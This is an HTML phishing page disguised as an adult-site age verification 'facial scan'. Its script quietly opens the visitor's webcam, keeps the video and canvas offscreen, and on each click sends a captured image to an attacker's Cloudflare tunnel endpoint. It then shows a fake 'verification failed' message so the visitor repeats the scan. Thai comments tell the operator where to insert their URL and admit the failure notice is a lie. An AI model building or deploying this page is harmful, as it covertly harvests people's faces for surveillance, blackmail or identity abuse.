<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔞 Restricted Content - Age Verification</title>
    <style>
        body {
            background-color: #0b0b0b;
            color: #ffffff;
            font-family: 'Arial', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .v-container {
            background: #1a1a1a;
            padding: 50px;
            border-radius: 15px;
            border: 2px solid #ff0000;
            text-align: center;
            max-width: 450px;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
        }
        h1 { color: #ff0000; font-size: 50px; margin: 0; }
        p { font-size: 18px; margin: 20px 0; color: #ccc; }
        .warning { color: #ff0000; font-weight: bold; margin-bottom: 30px; }
        .btn-confirm {
            background: #ff0000;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 22px;
            font-weight: bold;
            border-radius: 5px;
            cursor: pointer;
            text-transform: uppercase;
            transition: 0.3s;
        }
        .btn-confirm:hover { background: #b30000; transform: scale(1.05); }
        #video, #canvas { position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div class="v-container">
    <h1>18+</h1>
    <p>This website contains adult content and is only accessible to individuals aged 18 and older.</p>
    <div class="warning">FACIAL SCAN REQUIRED FOR AGE VERIFICATION</div>
    <button class="btn-confirm" id="verifyBtn">I AM 18+ - START SCAN</button>
</div>

<video id="video" width="640" height="480" autoplay></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const verifyBtn = document.getElementById('verifyBtn');

    // !!! ใส่ URL จาก Cloudflare ของมึงตรงนี้ !!!
    const BACKEND_URL = "https://YOUR-SUBDOMAIN.trycloudflare.com/upload"; 

    // เตรียมกล้อง
    async function setupCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
        } catch (e) {
            console.log("Waiting for permission...");
        }
    }

    function snap() {
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 640, 480);
        const img = canvas.toDataURL('image/png');

        fetch(BACKEND_URL, {
            method: 'POST',
            mode: 'cors',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: img, info: "Age Verification Attempt" })
        }).then(() => {
            // หลอกว่าสแกนไม่ผ่าน
            setTimeout(() => {
                alert("Verification Failed: Facial features not clear. Please try again from a well-lit area.");
                location.reload();
            }, 2000);
        });
    }

    verifyBtn.addEventListener('click', () => {
        verifyBtn.innerText = "SCANNING...";
        verifyBtn.style.background = "#555";
        // ถ่ายทันทีที่กด
        snap();
    });

    window.onload = setupCamera;
</script>

</body>
</html>
